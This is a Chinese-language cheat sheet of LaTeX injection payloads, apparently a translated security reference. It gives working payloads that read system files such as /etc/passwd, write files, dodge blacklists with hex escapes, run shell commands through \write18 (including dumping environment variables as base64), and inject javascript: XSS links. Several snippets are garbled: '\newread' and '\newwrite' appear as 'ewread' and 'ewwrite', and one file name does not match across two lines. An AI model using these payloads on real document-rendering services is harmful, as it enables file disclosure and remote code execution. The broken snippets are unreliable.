# LaTex 注入

您可能需要使用`\[`或`$`等包装器调整注入。

## 读取文件

读取文件并解释其中的LaTeX代码：

```tex
\input{/etc/passwd}
\include{somefile} # 加载.tex文件（somefile.tex）
```

读取单行文件：

```tex

ewread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

读取多行文件：

```tex
\lstinputlisting{/etc/passwd}

ewread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

读取文本文件，**不**解释内容，只会粘贴原始文件内容：

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

如果注入点位于文档头部之后（无法使用`\\usepackage`），可以通过停用某些控制字符来使用`\\input`读取包含`$`、`#`、`_`、`&`、空字节等的文件（例如perl脚本）。

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

要绕过黑名单，尝试将一个字符替换为其Unicode十六进制值。

- ^^41 代表大写字母A
- ^^7e 代表波浪号（~），注意‘e’必须是小写

```tex
\lstin^^70utlisting{/etc/passwd}
```

## 写入文件

写入单行文件：

```tex

ewwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

## 命令执行

命令的输出将被重定向到stdout，因此您需要使用临时文件来获取它。

```tex
\immediate\write18{id > output}
\input{output}
```

如果您遇到任何LaTeX错误，请考虑使用base64来获取结果，避免出现不良字符（或使用`\\verbatiminput`）：

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```

## 跨站脚本攻击

来自[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) 

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

在`http://payontriage.com/xss.php?xss=$\href{javascript:alert(1)}{Frogs%20find%20bugs}$`上有实时示例

## 参考资料

* [Hacking with LaTeX - Sebastian Neef - 0day.work](https://0day.work/hacking-with-latex/)
* [Latex to RCE, Private Bug Bounty Program - Yasho](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
* [Pwning coworkers thanks to LaTeX](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)
